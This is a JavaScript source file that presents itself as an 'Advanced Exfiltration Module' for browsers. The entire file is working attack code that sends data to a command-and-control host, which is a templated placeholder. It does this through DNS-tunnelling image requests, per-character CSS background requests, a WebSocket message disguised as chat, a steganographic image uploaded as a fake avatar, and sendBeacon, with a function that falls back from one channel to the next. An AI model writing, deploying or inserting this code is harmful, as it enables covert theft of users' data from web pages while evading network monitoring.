/**
 * exfil.js - Advanced Exfiltration Module
 * Implements DNS tunneling, CSS exfil, WebSocket covert channels, and image steganography.
 */

const Exfil = (() => {
    const C2_BASE = /*{{C2_BASE}}*/ 'https://c2.example.com';
    const DNS_SUFFIX = '.data.c2.example.com';

    // --- Helper: Chunk data into small pieces ---
    function chunk(str, size = 63) {
        const chunks = [];
        for (let i = 0; i < str.length; i += size) {
            chunks.push(str.slice(i, i + size));
        }
        return chunks;
    }

    // --- Method 1: DNS Tunneling ---
    // Encodes data in subdomain queries
    async function dnsTunnel(data) {
        const encoded = btoa(JSON.stringify(data)).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
        const chunks = chunk(encoded, 60);

        for (let i = 0; i < chunks.length; i++) {
            try {
                // Trigger DNS lookup via image load (no CORS issues)
                const img = new Image();
                img.src = `https://${chunks[i]}.${i}${DNS_SUFFIX}/pixel.gif?t=${Date.now()}`;
            } catch (e) { }
            await new Promise(r => setTimeout(r, 50));
        }
    }

    // --- Method 2: CSS Exfiltration ---
    // Uses background-image requests for each character
    async function cssExfil(data, fieldName = 'secret') {
        const chars = JSON.stringify(data).split('');
        const style = document.createElement('style');

        let css = '';
        chars.forEach((char, i) => {
            const code = char.charCodeAt(0);
            css += `
                [data-exfil="${fieldName}${i}"] {
                    background-image: url('${C2_BASE}/css/${fieldName}/${i}/${code}');
                }
            `;
        });

        style.textContent = css;
        document.head.appendChild(style);

        // Create hidden elements to trigger the CSS
        const container = document.createElement('div');
        container.style.cssText = 'position:absolute;left:-9999px;';
        chars.forEach((_, i) => {
            const el = document.createElement('span');
            el.setAttribute('data-exfil', `${fieldName}${i}`);
            container.appendChild(el);
        });
        document.body.appendChild(container);

        // Cleanup after a delay
        setTimeout(() => {
            style.remove();
            container.remove();
        }, 5000);
    }

    // --- Method 3: WebSocket Covert Channel ---
    async function wsChannel(data) {
        return new Promise((resolve, reject) => {
            try {
                const ws = new WebSocket(`wss://chat.example.com/stream`);
                ws.onopen = () => {
                    // Disguise as chat message
                    ws.send(JSON.stringify({
                        type: 'message',
                        room: 'general',
                        content: btoa(JSON.stringify(data))
                    }));
                    ws.close();
                    resolve(true);
                };
                ws.onerror = () => reject(false);
            } catch (e) {
                reject(false);
            }
        });
    }

    // --- Method 4: Image Steganography ---
    // Encodes data in LSB of image pixels
    async function stegoExfil(data) {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');

        // Create a small image to embed data
        const bytes = new TextEncoder().encode(JSON.stringify(data));
        const size = Math.ceil(Math.sqrt(bytes.length / 3)) + 1;
        canvas.width = size;
        canvas.height = size;

        // Fill with noise
        const imageData = ctx.createImageData(size, size);
        for (let i = 0; i < imageData.data.length; i++) {
            imageData.data[i] = Math.floor(Math.random() * 256);
        }

        // Embed data in LSB
        for (let i = 0; i < bytes.length; i++) {
            const pixelIndex = i * 4;
            imageData.data[pixelIndex] = (imageData.data[pixelIndex] & 0xFE) | ((bytes[i] >> 7) & 1);
            imageData.data[pixelIndex + 1] = (imageData.data[pixelIndex + 1] & 0xFE) | ((bytes[i] >> 3) & 1);
            imageData.data[pixelIndex + 2] = (imageData.data[pixelIndex + 2] & 0xFE) | (bytes[i] & 1);
        }

        ctx.putImageData(imageData, 0, 0);

        // Send as image upload
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('avatar', blob, 'profile.png');
            try {
                await fetch(`${C2_BASE}/upload`, { method: 'POST', body: formData });
            } catch (e) { }
        }, 'image/png');
    }

    // --- Smart Exfil: Auto-selects best method ---
    async function smartExfil(data, priority = ['beacon', 'dns', 'ws', 'css']) {
        for (const method of priority) {
            try {
                switch (method) {
                    case 'beacon':
                        if (navigator.sendBeacon) {
                            navigator.sendBeacon(`${C2_BASE}/beacon`, JSON.stringify(data));
                            return true;
                        }
                        break;
                    case 'dns':
                        await dnsTunnel(data);
                        return true;
                    case 'ws':
                        await wsChannel(data);
                        return true;
                    case 'css':
                        await cssExfil(data);
                        return true;
                    case 'stego':
                        await stegoExfil(data);
                        return true;
                }
            } catch (e) {
                continue;
            }
        }
        return false;
    }

    return {
        dns: dnsTunnel,
        css: cssExfil,
        ws: wsChannel,
        stego: stegoExfil,
        smart: smartExfil
    };
})();

// Export for module systems
if (typeof module !== 'undefined' && module.exports) {
    module.exports = Exfil;
}
